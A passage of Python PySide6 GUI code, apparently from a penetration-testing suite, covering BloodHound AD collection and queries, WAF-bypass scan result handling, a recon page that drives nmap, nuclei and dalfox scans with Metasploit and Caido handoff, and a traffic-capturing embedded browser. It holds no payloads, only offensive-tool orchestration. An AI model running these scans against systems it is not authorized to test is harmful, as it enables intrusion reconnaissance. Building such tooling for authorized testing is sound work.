                self._ad_thread = QtCore.QThread()
                self._ad_worker = AdCollectorWorker(argv, outdir)
                self._ad_worker.moveToThread(self._ad_thread)
                self._ad_thread.started.connect(self._ad_worker.run)
                self._ad_worker.log_line.connect(lambda m: clog.append(str(m).rstrip()))

                def cdone(od):
                    clog.append(f'[+] Collector finished. Output in {od}')
                    collect_btn.setEnabled(True); cstop_btn.setEnabled(False)
                    if self._db:
                        self._db.finish_ad_run(run_id, 'done')
                    try:
                        self._ad_thread.quit(); self._ad_thread.wait(3000)
                    except Exception:
                        pass
                self._ad_worker.finished.connect(cdone)
                collect_btn.setEnabled(False); cstop_btn.setEnabled(True)
                self._ad_thread.start()

            def stop_collect():
                if getattr(self, '_ad_worker', None):
                    self._ad_worker.abort(); clog.append('[!] Stop requested (tree-kill).')
            collect_btn.clicked.connect(do_collect)
            cstop_btn.clicked.connect(stop_collect)

            # ---- Ingest tab ----
            itab = QWidget(); iv = QVBoxLayout(itab)
            zip_edit = QLineEdit(); zip_edit.setPlaceholderText('collected .zip')
            zip_btn = QPushButton('…'); zip_btn.setFixedWidth(32)
            token_edit = QLineEdit(); token_edit.setPlaceholderText('BloodHound CE bearer token (optional)')
            zrow = QHBoxLayout(); zrow.addWidget(QLabel('Zip:')); zrow.addWidget(zip_edit, 1); zrow.addWidget(zip_btn)
            iv.addLayout(zrow)
            iv.addWidget(QLabel('BloodHound CE URL + token (blank = manual drag-drop for legacy BloodHound):'))
            iv.addWidget(token_edit)
            upload_btn = QPushButton('Ingest into BloodHound CE'); iv.addWidget(upload_btn)
            ilog = QTextEdit(); ilog.setReadOnly(True); ilog.setStyleSheet('font-family:Consolas,monospace;font-size:11px;')
            iv.addWidget(ilog, 1)
            tabs.addTab(itab, 'Ingest')

            def pick_zip():
                p, _ = QFileDialog.getOpenFileName(dlg, 'Collected zip', filter='Zip (*.zip)')
                if p:
                    zip_edit.setText(p)
            zip_btn.clicked.connect(pick_zip)

            def do_ingest():
                res = adint.ingest_zip(zip_edit.text().strip(), bhce_url.text().strip(), token_edit.text().strip())
                ilog.append(f"[{res['strategy']}] {'OK' if res['ok'] else 'NOTE'}: {res['message']}")
            upload_btn.clicked.connect(do_ingest)

            # ---- Query tab ----
            qtab = QWidget(); qv = QVBoxLayout(qtab)
            qrow = QHBoxLayout()
            canned = QtWidgets.QComboBox()
            for name in adint.CANNED_QUERIES:
                canned.addItem(name)
            load_q = QPushButton('Load'); run_q = QPushButton('Run')
            qrow.addWidget(canned, 1); qrow.addWidget(load_q); qrow.addWidget(run_q)
            qv.addLayout(qrow)
            qedit = QtWidgets.QPlainTextEdit(); qedit.setMaximumHeight(90)
            qedit.setPlainText(list(adint.CANNED_QUERIES.values())[0])
            qv.addWidget(qedit)
            qpass_row = QHBoxLayout()
            qpass_row.addWidget(QLabel('Neo4j user:')); qpass_row.addWidget(neo_user)
            qpass_row.addWidget(QLabel('pass:')); qpass_row.addWidget(neo_pass)
            qv.addLayout(qpass_row)
            qresult = QTreeWidget(); qresult.setColumnCount(1); qresult.setHeaderLabels(['Result'])
            qv.addWidget(qresult, 1)
            tabs.addTab(qtab, 'Query')

            def load_query():
                qedit.setPlainText(adint.CANNED_QUERIES.get(canned.currentText(), ''))
            load_q.clicked.connect(load_query)

            def run_query():
                save_cfg()
                res = adint.run_cypher(qedit.toPlainText(), neo_host.text().strip() or '127.0.0.1',
                                       int(neo_port.text() or 7687), neo_user.text().strip() or 'neo4j',
                                       neo_pass.text())
                qresult.clear()
                if not res['ok']:
                    qresult.setHeaderLabels(['Error'])
                    qresult.addTopLevelItem(QTreeWidgetItem([res['error']]))
                    return
                rows = res['rows']
                if not rows:
                    qresult.setHeaderLabels(['Result'])
                    qresult.addTopLevelItem(QTreeWidgetItem(['(no rows)']))
                    return
                cols = list(rows[0].keys()) or ['value']
                qresult.setColumnCount(len(cols)); qresult.setHeaderLabels(cols)
                for r in rows[:500]:
                    qresult.addTopLevelItem(QTreeWidgetItem([str(r.get(c, '')) for c in cols]))
            run_q.clicked.connect(run_query)

            do_detect()
            return dlg

        def _on_target_summary(self, target, done_list, errors):
            try:
                self._per_target_results[target] = {
                    'done': list(done_list) if isinstance(done_list, list) else [],
                    'errors': list(errors) if isinstance(errors, list) else [],
                    'tmp': self._target_tmp_map.get(target)
                }
            except Exception:
                pass

        def _notify_scan_complete(self):
            """Best-effort OS tray notification when a scan finishes."""
            try:
                if not _load_prefs().get('notify_on_complete', True):
                    return
                from PySide6.QtWidgets import QSystemTrayIcon, QApplication
                if not QSystemTrayIcon.isSystemTrayAvailable():
                    return
                total = len(self._results)
                bypasses = sum(1 for r in self._results if r.get('bypass'))
                crit = sum(1 for r in self._results
                           if str(r.get('severity', '')).upper() in ('CRITICAL', 'HIGH'))
                if getattr(self, '_tray', None) is None:
                    icon = self.windowIcon()
                    if icon.isNull():
                        icon = QApplication.style().standardIcon(
                            QtWidgets.QStyle.StandardPixmap.SP_MessageBoxInformation)
                    self._tray = QSystemTrayIcon(icon, self)
                    self._tray.setToolTip(PRODUCT_NAME)
                self._tray.show()
                self._tray.showMessage(
                    'Blackthorn — scan complete',
                    f'{total} findings • {bypasses} confirmed bypasses • {crit} critical/high',
                    QSystemTrayIcon.MessageIcon.Information, 6000)
            except Exception:
                pass

        def _on_finished(self):
            self.append_log(_t('run_finished', self._lang))
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self._notify_scan_complete()
            # Make sure the live findings window reflects the final results.
            try:
                if getattr(self, '_live_window', None) is not None:
                    self._live_refresh()
            except Exception:
                pass
            try:
                self.threads_spin.setEnabled(True)
                self.delay_spin.setEnabled(True)
            except Exception:
                pass
            
            # Complete scan in database and add timeline event
            try:
                if self._db and self._current_scan_id:
                    # Count results and bypasses
                    total_findings = len(self._results)
                    total_bypasses = sum(1 for r in self._results if r.get('bypass'))
                    
                    # Complete scan record
                    self._db.finish_scan(
                        scan_id=self._current_scan_id,
                        total_findings=total_findings,
                        total_bypasses=total_bypasses,
                        waf_detected=getattr(self, '_detected_waf', None)
                    )
                    
                    # Add timeline event for scan completion
                    self._db.add_timeline_event(
                        scan_id=self._current_scan_id,
                        target='',
                        event_type='scan_completed',
                        event_data={
                            'total_findings': total_findings,
                            'total_bypasses': total_bypasses,
                            'waf': getattr(self, '_detected_waf', None)
                        }
                    )
            except Exception:
                pass
            
            # Change Results button to green when scan is done and has results, start pulsating
            try:
                if self._results:
                    self.results_btn.setEnabled(True)
                    self.results_btn.setStyleSheet(self._results_btn_green_style)
                    self._start_results_pulse()
            except Exception:
                pass

            if self._stop_requested:
                self._reset_progress_after_stop()
                try:
                    self.clean_tmp_files(silent=True, clear_targets=False)
                except Exception:
                    pass
                self._stop_requested = False

            # auto-clean removed; no automatic cleanup on finish
            # clean up worker thread
            try:
                if self._worker_thread is not None:
                    self._worker_thread.quit()
                    self._worker_thread.wait()
            except Exception:
                pass
            self._worker = None
            self._worker_thread = None
            try:
                self._update_legend_counts()
            except Exception:
                pass
        
        def _on_http_log_ready(self, http_log):
            """Handle HTTP log data from scanner"""
            try:
                self._http_log = http_log
                if http_log:
                    self.append_log(f"[+] 📝 HTTP Log: {len(http_log)} request(s) captured\n")
            except Exception:
                pass
        
        def _on_ssl_info_ready(self, ssl_info):
            """Handle SSL/TLS analysis data from scanner"""
            try:
                self._ssl_info = ssl_info
                if ssl_info and ssl_info.get('ssl_enabled'):
                    cert = ssl_info.get('certificate', {})
                    cipher = ssl_info.get('cipher', {})
                    issues = ssl_info.get('security_issues', [])
                    
                    self.append_log(f"[+] 🔐 SSL/TLS Analysis Complete\n")
                    if cert.get('subject'):
                        self.append_log(f"    └─ Certificate: {cert.get('subject', 'Unknown')[:60]}\n")
                    if cipher.get('name'):
                        self.append_log(f"    └─ Cipher: {cipher.get('name', 'Unknown')} ({cipher.get('bits', '?')} bits)\n")
                    if ssl_info.get('protocol'):
                        self.append_log(f"    └─ Protocol: {ssl_info.get('protocol')}\n")
                    if issues:
                        for issue in issues[:3]:
                            self.append_log(f"    └─ ⚠️ {issue}\n")
            except Exception:
                pass

        # ------------------------------------------------------------------ #
        # Recon section
        # ------------------------------------------------------------------ #
        def _recon_worker_cmd(self, target, tmp_path, timeout, top_ports, no_ports=False,
                              opts=None):
            """argv to run the recon engine, mirroring the scan-worker pattern
            (frozen --recon-worker vs `python -m wafpierce.recon`).

            ``opts`` is the per-stage customization from the recon page; when it is
            None (e.g. the scheduler) the engine defaults apply (tls + gau + nmap).
            """
            opts = opts or {}
            if IS_FROZEN:
                cmd = [sys.executable, '--recon-worker', '--target', target,
                       '--output', tmp_path]
            else:
                cmd = [sys.executable, '-u', '-m', 'wafpierce.recon', target,
                       '-o', tmp_path]
            cmd += ['--timeout', str(timeout), '--top-ports', str(top_ports)]
            cmd += ['--max-hosts', str(opts.get('max_hosts', 1000))]
            cmd += ['--crawl-depth', str(opts.get('crawl_depth', 2))]
            if no_ports or not opts.get('do_ports', True):
                cmd.append('--no-ports')
            if not opts.get('do_tls', True):
                cmd.append('--no-tls')
            if not opts.get('do_historical', True):
                cmd.append('--no-historical')
            if opts.get('do_naabu'):
                cmd.append('--naabu')
            if opts.get('do_crawl'):
                cmd.append('--crawl')
            if opts.get('do_nuclei'):
                cmd.append('--nuclei')
            if opts.get('do_xss'):
                cmd.append('--xss')
            if opts.get('nuclei_severity'):
                cmd += ['--nuclei-severity', str(opts['nuclei_severity'])]
            if opts.get('nuclei_tags'):
                cmd += ['--nuclei-tags', str(opts['nuclei_tags'])]
            return cmd

        def _build_recon_page(self):
            """The Recon section as an in-place page: run subfinder/amass/dnsx/
            httpx/nmap in a subprocess, stream output, and collect findings into a
            tree that can be merged into Results or handed off to Metasploit /
            Caido. The QProcess is parented to this cached page, so switching to
            another section never interrupts a running recon."""
            from PySide6 import QtWidgets, QtCore
            from PySide6.QtWidgets import (
                QDialog, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QSpinBox,
                QCheckBox, QPushButton, QPlainTextEdit, QTreeWidget,
                QTreeWidgetItem, QSplitter, QMessageBox, QFileDialog)
            from PySide6.QtCore import Qt, QProcess, QProcessEnvironment
            from PySide6.QtGui import QTextCursor
            import tempfile

            dlg = QtWidgets.QWidget()
            dlg.setObjectName('ReconPage')
            lay = QVBoxLayout(dlg)
            lay.setContentsMargins(22, 20, 22, 20)
            _hdr = QLabel('Recon  —  recon & light pentest')
            _hdr.setStyleSheet('font-size:18px; font-weight:bold; color:#58a6ff;')
            _hdr.setToolTip('subfinder · amass · dnsx · httpx · nmap  +  tlsx · gau · katana · nuclei · naabu · dalfox')
            lay.addWidget(_hdr)

            from PySide6.QtWidgets import QGridLayout, QGroupBox, QComboBox

            # Target + core options
            row = QHBoxLayout()
            row.addWidget(QLabel('Target:'))
            target_edit = QLineEdit()
            target_edit.setPlaceholderText('example.com or https://example.com')
            try:
                target_edit.setText((self.target_edit.text() or '').strip())
            except Exception:
                pass
            row.addWidget(target_edit, 1)
            row.addWidget(QLabel('Timeout(s):'))
            timeout_spin = QSpinBox(); timeout_spin.setRange(10, 3600); timeout_spin.setValue(300)
            row.addWidget(timeout_spin)
            row.addWidget(QLabel('Max hosts:'))
            maxhosts_spin = QSpinBox(); maxhosts_spin.setRange(1, 100000); maxhosts_spin.setValue(1000)
            maxhosts_spin.setToolTip('Cap on how many resolved hosts to actively probe (httpx).')
            row.addWidget(maxhosts_spin)
            row.addWidget(QLabel('Top ports:'))
            ports_spin = QSpinBox(); ports_spin.setRange(10, 65535); ports_spin.setValue(100)
            row.addWidget(ports_spin)
            lay.addLayout(row)

            # Stages — each one is individually switchable. ☑ = on by default.
            stages_box = QGroupBox('Stages  (✓ = run; tools install on demand)')
            sg = QGridLayout(stages_box)
            stage_chks = {}

            def _stage(key, label, tip, on, r, c):
                chk = QCheckBox(label); chk.setChecked(on); chk.setToolTip(tip)
                stage_chks[key] = chk
                sg.addWidget(chk, r, c)

            _stage('tls', 'TLS / SAN (tlsx)', 'Grab TLS certs and harvest extra subdomains from SANs.', True, 0, 0)
            _stage('historical', 'Historical URLs (gau)', 'Pull URLs from wayback / commoncrawl / otx.', True, 0, 1)
            _stage('ports', 'Ports (nmap)', 'nmap -sV service/version scan.', True, 0, 2)
            _stage('naabu', 'Fast ports (naabu)', 'Fast TCP connect port discovery across many hosts.', False, 1, 0)
            _stage('crawl', 'Crawl (katana)', 'Crawl live sites (incl. JS) for endpoints.', False, 1, 1)
            _stage('nuclei', 'Vuln scan (nuclei)', 'Run nuclei templates against live web services.', False, 1, 2)
            _stage('xss', 'XSS (dalfox)', 'Test URLs that carry parameters for XSS.', False, 2, 0)

            # nuclei + crawl tuning (compact 3-column grid)
            sg.addWidget(QLabel('nuclei sev:'), 3, 0)
            nuclei_sev_combo = QComboBox()
            nuclei_sev_combo.addItems(['low,medium,high,critical', 'medium,high,critical',
                                       'high,critical', 'critical',
                                       'info,low,medium,high,critical'])
            sg.addWidget(nuclei_sev_combo, 3, 1, 1, 2)
            sg.addWidget(QLabel('nuclei tags:'), 4, 0)
            nuclei_tags_edit = QLineEdit()
            nuclei_tags_edit.setPlaceholderText('blank = all  ·  e.g. cve,xss,sqli,rce')
            sg.addWidget(nuclei_tags_edit, 4, 1, 1, 2)
            sg.addWidget(QLabel('crawl depth:'), 5, 0)
            depth_spin = QSpinBox(); depth_spin.setRange(1, 5); depth_spin.setValue(2)
            sg.addWidget(depth_spin, 5, 1)

            # Presets
            preset_row = QHBoxLayout()
            fast_btn = QPushButton('Preset: Fast')
            full_btn = QPushButton('Preset: Full pentest')
            fast_btn.setToolTip('subfinder/amass + dnsx + httpx only')
            full_btn.setToolTip('Enable every stage (slower, deepest coverage)')
            preset_row.addWidget(QLabel('Presets:'))
            preset_row.addWidget(fast_btn); preset_row.addWidget(full_btn)
            preset_row.addStretch()
            sg.addLayout(preset_row, 6, 0, 1, 3)

            def _apply_preset(full):
                # Full = every stage on. Fast = the light defaults only.
                for k, chk in stage_chks.items():
                    chk.setChecked(True if full else k in ('tls', 'historical', 'ports'))
            fast_btn.clicked.connect(lambda: _apply_preset(False))
            full_btn.clicked.connect(lambda: _apply_preset(True))

            lay.addWidget(stages_box)

            def _collect_opts():
                return {
                    'max_hosts': maxhosts_spin.value(),
                    'crawl_depth': depth_spin.value(),
                    'nuclei_severity': nuclei_sev_combo.currentText(),
                    'nuclei_tags': nuclei_tags_edit.text().strip(),
                    'do_tls': stage_chks['tls'].isChecked(),
                    'do_historical': stage_chks['historical'].isChecked(),
                    'do_naabu': stage_chks['naabu'].isChecked(),
                    'do_crawl': stage_chks['crawl'].isChecked(),
                    'do_nuclei': stage_chks['nuclei'].isChecked(),
                    'do_xss': stage_chks['xss'].isChecked(),
                    'do_ports': stage_chks['ports'].isChecked(),
                }

            # Actions — two compact rows so the buttons never overflow a narrow
            # window (run controls on top, output actions below).
            run_row = QHBoxLayout()
            run_btn = QPushButton('▶  Run Recon')
            stop_btn = QPushButton('■  Stop'); stop_btn.setEnabled(False)
            tools_btn = QPushButton('⬇  Tools')
            tools_btn.setToolTip('Install optional recon tools: tlsx, gau, katana, nuclei, naabu, dalfox')
            run_row.addWidget(run_btn)
            run_row.addWidget(stop_btn)
            run_row.addStretch()
            run_row.addWidget(tools_btn)
            lay.addLayout(run_row)

            out_row = QHBoxLayout()
            merge_btn = QPushButton('＋ Merge to Results'); merge_btn.setEnabled(False)
            msf_btn = QPushButton('→ Metasploit'); msf_btn.setEnabled(False)
            caido_btn = QPushButton('→ Caido'); caido_btn.setEnabled(False)
            save_btn = QPushButton('Save JSON…'); save_btn.setEnabled(False)
            for b in (merge_btn, msf_btn, caido_btn, save_btn):
                out_row.addWidget(b)
            out_row.addStretch()
            lay.addLayout(out_row)
            tools_btn.clicked.connect(lambda: self._download_tools_dialog(
                ['tlsx', 'gau', 'katana', 'nuclei', 'naabu', 'dalfox'],
                'Optional recon tools — each one that installs adds a richer stage:\n'
                '  tlsx   — TLS certs + extra subdomains from SAN entries\n'
                '  gau    — historical URLs (wayback / commoncrawl / otx)\n'
                '  katana — crawl live sites for endpoints\n'
                '  nuclei — vulnerability / misconfiguration scan\n'
                '  naabu  — fast port discovery\n'
                '  dalfox — XSS scanning of URLs with parameters\n',
                title='Install optional recon tools'))

            # Results tree (top) + streaming log (bottom)
            split = QSplitter(Qt.Vertical)
            tree = QTreeWidget()
            tree.setHeaderLabels(['Technique', 'Target', 'Severity', 'Detail'])
            tree.setColumnWidth(0, 190); tree.setColumnWidth(1, 250); tree.setColumnWidth(2, 80)
            split.addWidget(tree)
            log = QPlainTextEdit(); log.setReadOnly(True)
            log.setStyleSheet('background:#0f1112; color:#cfe3f0; '
                              'font-family:Consolas,monospace; font-size:12px;')
            split.addWidget(log)
            split.setSizes([370, 250])
            lay.addWidget(split, 1)

            state = {'proc': None, 'tmp': None, 'findings': []}

            def _append(text):
                if not text:
                    return
                log.moveCursor(QTextCursor.End)
                log.insertPlainText(text)
                log.moveCursor(QTextCursor.End)

            def _populate(findings):
                tree.clear()
                sev_color = {'CRITICAL': '#ff5d6c', 'HIGH': '#ff9f43',
                             'MEDIUM': '#f6e05e', 'LOW': '#63b3ed', 'INFO': '#9aa7b2'}
                from PySide6.QtGui import QBrush, QColor
                for f in findings:
                    sev = str(f.get('severity', 'INFO')).upper()
                    it = QTreeWidgetItem([
                        str(f.get('technique', '')), str(f.get('target', '')),
                        sev, str(f.get('reason', ''))[:240]])
                    try:
                        it.setForeground(2, QBrush(QColor(sev_color.get(sev, '#9aa7b2'))))
                    except Exception:
                        pass
                    tree.addTopLevelItem(it)

            def _set_outputs_enabled(on):
                for b in (merge_btn, msf_btn, caido_btn, save_btn):
                    b.setEnabled(on)

            def _on_stdout():
                proc = state['proc']
                if proc is not None:
                    _append(bytes(proc.readAllStandardOutput()).decode('utf-8', 'replace'))

            def _on_finished(code=0, status=None):
                run_btn.setEnabled(True); stop_btn.setEnabled(False)
                findings = []
                tmp = state['tmp']
                if tmp and os.path.exists(tmp):
                    try:
                        with open(tmp, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                        findings = data if isinstance(data, list) else []
                    except Exception as e:
                        _append(f"\n[!] could not parse recon output: {e}\n")
                    finally:
                        try:
                            os.unlink(tmp)
                        except Exception:
                            pass
                state['findings'] = findings
                _populate(findings)
                _set_outputs_enabled(bool(findings))
                _append(f"\n[recon] finished (exit {code}) — {len(findings)} finding(s)\n")

            def _run():
                import shutil
                target = target_edit.text().strip()
                if not target:
                    QMessageBox.warning(dlg, 'Recon', 'Enter a target first.')
                    return
                opts = _collect_opts()
                # Hard preflight: recon requires the core tools. Offer to download
                # them instead of leaving the user at a dead end.
                try:
                    from .recon import preflight, format_preflight_error, STAGE_TOOL
                    missing = [t for t in preflight()
                               if not (t[0] == 'nmap' and not opts.get('do_ports', True))]
                    if missing:
                        _append(format_preflight_error(missing) + '\n')
                        self._show_recon_tools_dialog(missing)
                        return
                    # Prompt to install tools for any ENABLED optional stage that
                    # is missing its binary (this is the "it didn't prompt me" fix).
                    want = []
                    for key, tool in STAGE_TOOL.items():
                        if opts.get(f'do_{key}') and not shutil.which(tool):
                            want.append(tool)
                    if want:
                        ret = QMessageBox.question(
                            dlg, 'Install recon tools?',
                            'These enabled stages need tools that aren’t installed yet:\n\n'
                            '    ' + ', '.join(want) + '\n\n'
                            'Download them now?  (No = run anyway; those stages are skipped.)',
                            QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel,
                            QMessageBox.Yes)
                        if ret == QMessageBox.Cancel:
                            return
                        if ret == QMessageBox.Yes:
                            self._download_tools_dialog(
                                want, 'Installing tools for the enabled recon stages…',
                                title='Install recon tools')
                except Exception:
                    pass
                tmpf = tempfile.NamedTemporaryFile(delete=False, suffix='.json')
                tmpf.close()
                state['tmp'] = tmpf.name
                log.clear(); tree.clear(); _set_outputs_enabled(False)
                cmd = self._recon_worker_cmd(
                    target, state['tmp'], timeout_spin.value(),
                    ports_spin.value(), opts=opts)
                proc = QProcess(dlg)
                proc.setProcessChannelMode(QProcess.ProcessChannelMode.MergedChannels)
                env = QProcessEnvironment.systemEnvironment()
                env.insert('PYTHONIOENCODING', 'utf-8')
                env.insert('PYTHONUNBUFFERED', '1')
                proc.setProcessEnvironment(env)
                proc.readyReadStandardOutput.connect(_on_stdout)
                proc.finished.connect(_on_finished)
                state['proc'] = proc
                _append('[recon] $ ' + ' '.join(cmd) + '\n\n')
                run_btn.setEnabled(False); stop_btn.setEnabled(True)
                proc.start(cmd[0], cmd[1:])

            def _stop():
                proc = state['proc']
                if proc is not None:
                    proc.kill()
                    _append('\n[recon] stopped by user\n')

            def _merge():
                if state['findings']:
                    self._results.extend(state['findings'])
                    try:
                        self._refresh_tree_display()
                    except Exception:
                        pass
                    QMessageBox.information(
                        dlg, 'Recon',
                        f"Merged {len(state['findings'])} recon finding(s) into Results.")

            def _save():
                path, _ = QFileDialog.getSaveFileName(
                    dlg, 'Save recon findings', 'recon.json', 'JSON files (*.json)')
                if path:
                    try:
                        with open(path, 'w', encoding='utf-8') as f:
                            json.dump(state['findings'], f, indent=2, default=str)
                        _append(f"\n[recon] saved {len(state['findings'])} finding(s) to {path}\n")
                    except Exception as e:
                        QMessageBox.warning(dlg, 'Save failed', str(e))

            def _run_handoff(cmd, env_extra, label):
                """Run an msf/caido CLI subcommand against the recon findings."""
                if not state['findings']:
                    return
                tmpf = tempfile.NamedTemporaryFile(delete=False, suffix='.json')
                try:
                    json.dump(state['findings'], open(tmpf.name, 'w', encoding='utf-8'),
                              default=str)
                finally:
                    tmpf.close()
                full = cmd + [tmpf.name]
                proc = QProcess(dlg)
                proc.setProcessChannelMode(QProcess.ProcessChannelMode.MergedChannels)
                env = QProcessEnvironment.systemEnvironment()
                for k, v in (env_extra or {}).items():
                    if v:
                        env.insert(k, str(v))
                proc.setProcessEnvironment(env)
                proc.readyReadStandardOutput.connect(
                    lambda: _append(bytes(proc.readAllStandardOutput()).decode('utf-8', 'replace')))
                proc.finished.connect(lambda c, s=None: _append(f"\n[{label}] done (exit {c})\n"))
                self._handoff_procs = getattr(self, '_handoff_procs', [])
                self._handoff_procs.append(proc)  # keep ref
                _append(f"\n[{label}] $ {' '.join(full)}\n")
                proc.start(full[0], full[1:])

            def _send_msf():
                prefs = self._prefs or {}
                pw = prefs.get('msf_password', '') or os.environ.get('MSF_RPC_PASSWORD', '')
                if not pw:
                    QMessageBox.information(
                        dlg, 'Metasploit',
                        'Set the msfrpcd password in Settings → Integrations first '
                        '(and start `msfrpcd -P <pw> -p 55553`).')
                    return
                if IS_FROZEN:
                    base = [sys.executable, '--msf-worker', 'push']
                else:
                    base = [sys.executable, '-u', '-m', 'wafpierce.msf', 'push']
                # recon findings are informational -> push them all, not just confirmed
                base += ['--all', '--workspace', str(prefs.get('msf_workspace', 'blackthorn'))]
                if prefs.get('msf_host'):
                    base += ['--msf-host', str(prefs['msf_host'])]
                if prefs.get('msf_port'):
                    base += ['--msf-port', str(prefs['msf_port'])]
                if prefs.get('msf_no_ssl'):
                    base += ['--msf-no-ssl']
                _run_handoff(base, {'MSF_RPC_PASSWORD': pw}, 'msf')

            def _send_caido():
                prefs = self._prefs or {}
                proxy_url = prefs.get('caido_proxy_url', 'http://127.0.0.1:8080')
                if IS_FROZEN:
                    base = [sys.executable, '--caido-worker', '--proxy-url', proxy_url, 'push', '--all']
                else:
                    base = [sys.executable, '-u', '-m', 'wafpierce.caido',
                            '--proxy-url', proxy_url, 'push', '--all']
                _run_handoff(base, {}, 'caido')

            run_btn.clicked.connect(_run)
            stop_btn.clicked.connect(_stop)
            merge_btn.clicked.connect(_merge)
            save_btn.clicked.connect(_save)
            msf_btn.clicked.connect(_send_msf)
            caido_btn.clicked.connect(_send_caido)

            # Keep a handle so other code (e.g. abort on quit) can reach the proc.
            self._recon_state = state
            return dlg

        def _show_recon_tools_dialog(self, missing):
            """Recon preflight failed: offer to download the missing required tools."""
            from .recon import format_preflight_error
            self._download_tools_dialog(
                [t[0] for t in missing],
                format_preflight_error(missing),
                title='Recon tools missing')

        def _download_tools_dialog(self, names, intro, title='Recon tools'):
            """Generic tool installer: shows ``intro``, downloads ``names`` on a
            worker thread, streams progress, then reports which are now on PATH.
            Used for both the required-tools preflight and the optional extras."""
            from PySide6.QtWidgets import (QDialog, QVBoxLayout, QHBoxLayout,
                                           QPlainTextEdit, QPushButton, QLabel)
            from PySide6.QtCore import QTimer
            import threading
            import queue
            import shutil

            dlg = QDialog(self)
            dlg.setWindowTitle(title)
            dlg.resize(760, 560)
            v = QVBoxLayout(dlg)

            log = QPlainTextEdit()
            log.setReadOnly(True)
            log.setStyleSheet('font-family:Consolas,monospace; font-size:12px;')
            log.setPlainText(intro)
            v.addWidget(log, 1)

            status = QLabel('')
            status.setStyleSheet('color:#8b949e;')
            v.addWidget(status)

            row = QHBoxLayout()
            dl_btn = QPushButton('⬇  Download all')
            dl_btn.setObjectName('PrimaryButton')
            close_btn = QPushButton('Close')
            row.addStretch()
            row.addWidget(dl_btn)
            row.addWidget(close_btn)
            v.addLayout(row)
            close_btn.clicked.connect(dlg.accept)

            q = queue.Queue()

            def _drain():
                drained_done = False
                try:
                    while True:
                        kind, payload = q.get_nowait()
                        if kind == 'log':
                            log.appendPlainText(payload)
                        elif kind == 'status':
                            status.setText(payload)
                        elif kind == 'done':
                            drained_done = True
                except queue.Empty:
                    pass
                if drained_done:
                    timer.stop()
                    try:
                        from . import recon_install as _ri
                        left = [n for n in names if not _ri.is_installed(n)]
                    except Exception:
                        left = [n for n in names if not shutil.which(n)]
                    if not left:
                        status.setText('✓ All installed — they are on PATH now.')
                        dl_btn.setText('✓ Installed')
                    else:
                        dl_btn.setEnabled(True)
                        dl_btn.setText('⬇  Retry download')
                        status.setText('Still missing: ' + ', '.join(left) + '  (see log above)')

            timer = QTimer(dlg)
            timer.timeout.connect(_drain)

            def _start():
                dl_btn.setEnabled(False)
                dl_btn.setText('Downloading…')
                status.setText('Starting download…')
                log.appendPlainText('\n──────── downloading tools ────────')

                def _work():
                    try:
                        from . import recon_install
                        recon_install.download_all(
                            only=list(names),
                            log=lambda m: q.put(('log', m)),
                            status=lambda m: q.put(('status', m)))
                    except Exception as e:
                        q.put(('log', f'[!] installer error: {type(e).__name__}: {e}'))
                    finally:
                        q.put(('done', None))

                threading.Thread(target=_work, daemon=True).start()
                timer.start(150)

            dl_btn.clicked.connect(_start)
            dlg.exec()

        def _build_browser_page(self):
            """Embedded browser that captures all of its HTTP(S) traffic.

            Capture is two-pronged: a request interceptor logs every request
            (breadth — page loads, images, scripts …) while an injected JS hook
            wraps fetch/XMLHttpRequest to capture full request+response with
            headers and bodies (depth — the API/AJAX calls). Captured rows land in
            a sortable / filterable / searchable table below the browser; select a
            row for detail or Expand for the full transaction.
            """
            from PySide6 import QtWidgets
            from PySide6.QtWidgets import (
                QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QPushButton, QComboBox,
                QTableWidget, QTableWidgetItem, QSplitter, QPlainTextEdit,
                QHeaderView, QAbstractItemView, QTabWidget, QMenu)
            from PySide6.QtCore import Qt, Signal, QUrl
            from PySide6.QtGui import QBrush, QColor
            from datetime import datetime
            from urllib.parse import urlparse, parse_qs
            import json as _json
            import re as _re

            # QtWebEngine is an optional (large) component; degrade gracefully.
            try:
                from PySide6.QtWebEngineWidgets import QWebEngineView
                from PySide6.QtWebEngineCore import (
                    QWebEnginePage, QWebEngineProfile, QWebEngineScript, QWebEngineSettings,
                    QWebEngineUrlRequestInterceptor, QWebEngineUrlRequestInfo)
            except Exception as e:
                page = QWidget()
                pv = QVBoxLayout(page)
                pv.setContentsMargins(22, 20, 22, 20)
                hdr = QLabel('◍  Browser')
                hdr.setStyleSheet('font-size:18px; font-weight:bold; color:#58a6ff;')
                msg = QLabel('The Browser section needs QtWebEngine, which is not '
                             'installed.\n\nInstall it with:\n    pip install PySide6-Addons\n\n'
                             f'(import error: {e})')
                msg.setStyleSheet('color:#8b949e;')
                pv.addWidget(hdr); pv.addWidget(msg); pv.addStretch()
                return page

            if not hasattr(self, '_browser_txns'):
                self._browser_txns = []
            if not hasattr(self, '_browser_issues'):
                self._browser_issues = []
            state = {'seq': 0, 'paused': False}

            # Resource-type id -> short name, and the XHR id we skip (JS captures it).
            _RT = {}
            _XHR_INT = None
            try:
                RTenum = QWebEngineUrlRequestInfo.ResourceType
                for nm in dir(RTenum):
                    if nm.startswith('ResourceType'):
                        try:
                            _RT[int(getattr(RTenum, nm))] = nm[len('ResourceType'):] or 'Other'
                        except Exception:
                            pass
                _XHR_INT = int(getattr(RTenum, 'ResourceTypeXhr'))
            except Exception:
                pass
            _RT_BY_NAME = {v.lower(): k for k, v in _RT.items()}  # 'image'->id, etc.

            HOOK_JS = r"""
            (function(){
              if (window.__wpcapInstalled) return;
              window.__wpcapInstalled = true;
              var MAX = 200000;
              function send(rec){
                try {
                  if (rec.respBody && rec.respBody.length > MAX) rec.respBody = rec.respBody.slice(0,MAX) + ' ...(truncated)';
                  if (rec.reqBody && rec.reqBody.length > MAX) rec.reqBody = rec.reqBody.slice(0,MAX) + ' ...(truncated)';
                  console.log('__WPCAP__' + JSON.stringify(rec));
                } catch(e){}
              }
              var of = window.fetch;
              if (of){
                window.fetch = function(input, init){
                  var url = (typeof input === 'string') ? input : (input && input.url) || '';
                  var method = (init && init.method) || (typeof input==='object' && input && input.method) || 'GET';
                  var reqBody = (init && init.body) ? String(init.body) : '';
                  var reqHeaders = {};
                  try { if (init && init.headers){ new Headers(init.headers).forEach(function(v,k){reqHeaders[k]=v;}); } } catch(e){}
                  var t0 = Date.now();
                  return of.apply(this, arguments).then(function(resp){
                    try {
                      resp.clone().text().then(function(body){
